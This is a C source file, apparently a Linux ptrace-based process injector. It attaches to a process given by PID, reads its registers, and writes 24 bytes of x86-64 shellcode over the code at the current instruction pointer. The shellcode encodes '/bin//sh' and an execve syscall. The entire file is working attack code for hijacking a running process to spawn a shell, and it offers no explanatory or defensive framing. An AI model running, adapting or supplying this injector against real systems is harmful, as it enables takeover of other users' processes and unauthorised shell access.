#include <elf.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>

#define SHELLCODE_SIZE 24
const char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e"
                         "\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

void inject_code(pid_t pid, const char *src, void *dst, int len) {
  int i;
  uint64_t *s = (uint64_t *)src;
  uint64_t *d = (uint64_t *)dst;

  for (i = 0; i < len; i += 8, ++s, ++d) {
    if (ptrace(PTRACE_POKETEXT, pid, d, *s) < 0) {
      perror("ptrace(POKETEXT)");
      exit(1);
    }
  }
}

int main(int argc, char **argv) {
  if (argc != 2) {
    fprintf(stderr, "[-] Usage: %s PID\n", argv[0]);
    exit(1);
  }

  int pid = atoi(argv[1]);
  printf("[+] Tracing %d\n", pid);
  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
    perror("ptrace(ATTACH)");
    exit(1);
  }
  wait(NULL);
  printf("[+] Attached to %d\n", pid);

  struct user_regs_struct regs;
  if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
    perror("ptrace(GETREGS)");
    exit(1);
  }

  inject_code(pid, shellcode, (void *)regs.rip, SHELLCODE_SIZE);
  return 0;
}
